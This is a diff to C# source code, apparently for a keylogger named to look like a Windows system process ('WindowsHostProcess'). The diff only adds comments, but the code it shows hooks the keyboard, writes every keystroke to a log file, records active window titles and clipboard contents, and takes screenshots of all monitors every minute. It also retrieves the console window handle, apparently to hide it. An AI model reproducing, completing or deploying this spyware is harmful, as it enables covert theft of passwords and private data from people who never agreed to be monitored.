@@ -23,9 +23,11 @@ namespace WindowsHostProcess
         public static Screen[] zScreen = Screen.AllScreens;
         public static int screens = zScreen.Length;
 
-        [STAThread]
+        [STAThread] //Needed for reading from Clipboard
         public static void Main(string[] args)
         {
+
+            //Timer for Screen Capture Interval and Call of Screen Capture Function.
             var handle = GetConsoleWindow();
             var startTimeSpan = TimeSpan.Zero;
             var periodTimeSpan = TimeSpan.FromMinutes(1);
@@ -43,6 +45,7 @@ namespace WindowsHostProcess
             UnhookWindowsHookEx(_hookID);
         }
 
+        // Function to get the Title of the Foreground Window the user is working in.
         private static string GetActiveWindowTitle()
         {
             const int nChars = 256;
@@ -56,6 +59,7 @@ namespace WindowsHostProcess
             return null;
         }
 
+        // Function to get the contents of the clipboard and return it when contents change.
         private static string GetClipboardData()
         {
 
@@ -74,7 +78,8 @@ namespace WindowsHostProcess
         }
 
 
-
+        // Screen Capture Function Implementation. Determines number of Monitors,
+        // their size, and creates appropriate screen capture size accordingly.
         private static void printScreen()
         {
             int lowestBound = int.MaxValue;
@@ -128,6 +133,7 @@ namespace WindowsHostProcess
 
                 newWin = GetActiveWindowTitle();
 
+                //Formatting for log output with Window names.
                 if(newWin != preWin)
                 {
                     if (fstWin == 1)
@@ -150,6 +156,7 @@ namespace WindowsHostProcess
                     }
                 }
 
+                //Switch cases for each button on the keyboard.
                 switch ((Keys)vkCode)
                 {
                     case Keys.NumPad0:
@@ -253,6 +260,7 @@ namespace WindowsHostProcess
                         sw.Write("*");
                         break;
 
+                    // Switch cases for Shift Sensitive Characters.
                     case Keys.Oemcomma:
                         if (Control.ModifierKeys != Keys.Shift)
                             sw.Write(",");
@@ -504,7 +512,7 @@ namespace WindowsHostProcess
                                             
                     default:
                         if (Control.ModifierKeys != Keys.Shift)
-                            sw.Write(((char)(Keys)vkCode).ToString().ToLower());//Make these lowercase
+                            sw.Write(((char)(Keys)vkCode).ToString().ToLower()); //Make these lowercase
                         else
                             switch ((Keys)vkCode)
                             {
